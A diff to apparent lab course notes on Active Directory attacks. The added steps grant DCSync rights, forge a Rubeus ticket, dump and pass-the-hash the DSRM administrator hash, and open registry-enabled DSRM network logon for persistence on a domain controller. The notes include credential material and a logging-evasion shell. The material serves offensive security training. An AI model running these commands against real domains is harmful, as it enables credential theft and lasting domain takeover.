@@ -405,7 +405,7 @@ Get-RemoteMachineAccountHash -ComputerName target -Verbose
 
 **Detection of Replication Rights:**
 ```powershell
-# Check if user has replication rights
+# Check if specific user has replication rights
 Get-DomainObjectAcl -SearchBase "DC=dollarcorp,DC=moneycorp,DC=local" 
   -SearchScope Base -ResolveGUIDs | 
   ?{($_.ObjectAceType -match 'replication-get') -or 
@@ -413,16 +413,32 @@ Get-DomainObjectAcl -SearchBase "DC=dollarcorp,DC=moneycorp,DC=local"
   ForEach-Object {$_ | Add-Member NoteProperty 'IdentityName' 
     $(Convert-SidToName $_.SecurityIdentifier);$_} | 
   ?{$_.IdentityName -match "studentx"}
+
+# If output is empty, user does NOT have replication rights
+# If output shows entries, user HAS replication rights → can execute DCSync
 ```
 
-**Adding Replication Rights (requires DA):**
+**Adding Replication Rights (requires DA on student VM):**
 ```powershell
-Add-DomainObjectAcl -TargetIdentity 'DC=dollarcorp,DC=moneycorp,DC=local' 
+# Start process as Domain Admin
+C:\AD\Tools> C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe 
+  -args asktgt /user:svcadmin /aes256:6366243a657a4ea04e406f1abc27f1ada358ccd0138ec5ca2835067719dc7011 
+    /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
+
+# In DA process, grant replication rights
+C:\Windows\system32> C:\AD\Tools\InviShell\RunWithPathAsAdmin.bat
+PS C:\Windows\system32> . C:\AD\Tools\PowerView.ps1
+PS C:\Windows\system32> Add-DomainObjectAcl -TargetIdentity 'DC=dollarcorp,DC=moneycorp,DC=local' 
   -PrincipalIdentity studentx 
   -Rights DCSync 
   -PrincipalDomain dollarcorp.moneycorp.local 
   -TargetDomain dollarcorp.moneycorp.local 
   -Verbose
+
+# Verify grant succeeded
+Get-DomainObjectAcl -SearchBase "DC=dollarcorp,DC=moneycorp,DC=local" 
+  -SearchScope Base -ResolveGUIDs | 
+  ?{$_.IdentityName -match "studentx" -and $_.ObjectAceType -match 'replication-get'}
 ```
 
 **Executing DCSync:**
@@ -1593,44 +1609,69 @@ Get-RemoteMachineAccountHash -ComputerName dcorp-dc
 
 ## SECTION 9: PERSISTENCE MECHANISMS
 
-### DSRM Administrator Abuse
+### DSRM Administrator Abuse (DC Persistence)
 
-#### Enable Network Logon
+**Use Case:** Maintain persistent admin access to DC even after password reset
+
+#### Step 1: Extract DSRM Administrator Hash
 ```powershell
-# From DC with DA privileges
-winrs -r:dcorp-dc "reg add 
-  HKLM\System\CurrentControlSet\Control\Lsa 
-  /v DsrmAdminLogonBehavior 
-  /t REG_DWORD /d 2 /f"
-
-# Value meanings:
-# 0 = Deny network logon (default)
-# 1 = Local logon only
-# 2 = Network logon allowed
-```
-
-#### Extract DSRM Hash
-```powershell
-# From DC with DA privileges
-SafetyKatz "token::elevate" "lsadump::sam"
+# From DC with DA privileges (requires local SYSTEM access on DC)
+C:\Users\svcadmin> C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe 
+  -args "token::elevate" "lsadump::evasive-sam" "exit"
 
 # Output: Administrator (DSRM) NTLM hash
+# Example: a102ad5753f4c441e3af31c97fad86fd
 ```
 
-#### Use for Persistence
+#### Step 2: Enable Network Logon for DSRM
 ```powershell
-# Pass-the-Hash with DSRM admin
-SafetyKatz "sekurlsa::pth 
-  /domain:dc_name
-  /user:Administrator
-  /ntlm:dsrm_hash
-  /run:cmd.exe"
+# By default, DSRM admin can only logon locally
+# From DC command session, modify registry:
+C:\Users\svcadmin> reg add "HKLM\System\CurrentControlSet\Control\Lsa" 
+  /v "DsrmAdminLogonBehavior" /t REG_DWORD /d 2 /f
 
-# From new process (SYSTEM on DC)
-winrs -r:dc cmd
-Enter-PSSession -ComputerName dc_ip 
-  -Authentication NegotiateWithImplicitCredential
+# Value meanings:
+# 0 = Deny network logon (default, most secure)
+# 1 = Local logon only
+# 2 = Network logon allowed (enables persistence)
 ```
+
+#### Step 3: Use DSRM Hash for Persistence
+
+**From Student VM (elevated shell):**
+```powershell
+# Pass-the-Hash with DSRM admin NTLM (not OverPass-the-Hash)
+C:\Windows\system32> C:\AD\Tools\Loader.exe -path C:\AD\Tools\SafetyKatz.exe 
+  -args "sekurlsa::evasive-pth /domain:dcorp-dc /user:Administrator 
+    /ntlm:a102ad5753f4c441e3af31c97fad86fd /run:cmd.exe" "exit"
+
+# New process spawned with DSRM admin NTLM hash cached
+```
+
+#### Step 4: Connect to DC via PowerShell Remoting
+
+**Configure TrustedHosts (required for NTLM auth):**
+```powershell
+PS C:\Windows\system32> Set-Item WSMan:\localhost\Client\TrustedHosts 172.16.2.1
+PS C:\Windows\system32> Set-Item WSMan:\localhost\Client\TrustedHosts -Value "*" -Concatenate
+```
+
+**Connect from new process (with DSRM hash):**
+```powershell
+PS C:\Windows\system32> C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat
+PS C:\AD\Tools> Enter-PSSession -ComputerName 172.16.2.1 
+  -Authentication NegotiateWithImplicitCredential
+
+# Connected as DSRM Administrator on DC
+[172.16.2.1]: PS C:\Users\Administrator.DCORP-DC\Documents> $env:username
+Administrator
+```
+
+**Key Differences from Golden Tickets:**
+- DSRM is local DC account, not Kerberos-based
+- Requires NTLM pass-the-hash (not AES256/Kerberos)
+- Works even if krbtgt is changed
+- Survives krbtgt password rotation (DA persistence guarantee)
 
 ---
 
